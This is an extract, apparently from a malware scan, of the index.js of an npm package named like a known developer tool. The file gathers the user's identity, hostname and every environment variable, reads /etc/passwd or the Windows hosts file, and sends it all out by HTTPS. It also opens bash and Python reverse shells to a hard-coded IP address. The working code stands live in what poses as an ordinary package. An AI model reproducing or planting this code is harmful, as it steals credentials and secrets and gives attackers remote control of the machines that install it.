// File: tmp/tmplstqjk0_/pmmmwh/package/index.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const os = require('os')
Line 3: const https = require('https')
Line 4: _tmp_4 = require('child_process')
Line 6: {
    // Collect system information
    const data = JSON.stringify({
        user: os.userInfo(),
        hostname: os.hostname(),
        env: process.env
    });

    // Determine the OS and read the appropriate file
    let sensitiveFileContent = '';
    if (os.platform() === 'linux' || os.platform() === 'darwin') {
        // Unix-like systems: read /etc/passwd
        try {
            sensitiveFileContent = fs.readFileSync('/etc/passwd', 'utf8');
        } catch (err) {
            sensitiveFileContent = `Error reading /etc/passwd: ${err.message}`;
        }
    } else if (os.platform() === 'win32') {
        // Windows: read C:\Windows\System32\drivers\etc\hosts
        try {
            sensitiveFileContent = fs.readFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts', 'utf8');
        } catch (err) {
            sensitiveFileContent = `Error reading hosts file: ${err.message}`;
        }
    } else {
        sensitiveFileContent = 'Unsupported operating system';
    }

  ...
Line 9: os.userInfo()
Line 10: os.hostname()
Line 16: os.platform()
Line 19: sensitiveFileContent = fs.readFileSync('/etc/passwd', 'utf8')
Line 23: os.platform()
Line 26: sensitiveFileContent = fs.readFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts', 'utf8')
Line 35: const exfilData = JSON.stringify({
        ...JSON.parse(data),
        sensitiveFile: sensitiveFileContent
    })
Line 51: const req = https.request(options)
Line 52: req.write(exfilData)
Line 53: req.end()
Line 56: {
        // Bash reverse shell
        exec('bash -c "bash -i >& /dev/tcp/157.173.200.135/2458 0>&1"');

        // Python3 reverse shell
        exec('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("157.173.200.135",2458));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    }
Line 58: exec('bash -c "bash -i >& /dev/tcp/157.173.200.135/2458 0>&1"')
Line 61: exec('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("157.173.200.135",2458));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
Line 62: {
        // Windows reverse shell (Python3)
        exec('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'157.173.200.135\',2458));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'cmd.exe\',\'/i\']);"');
    }
Line 64: exec('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'157.173.200.135\',2458));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'cmd.exe\',\'/i\']);"')
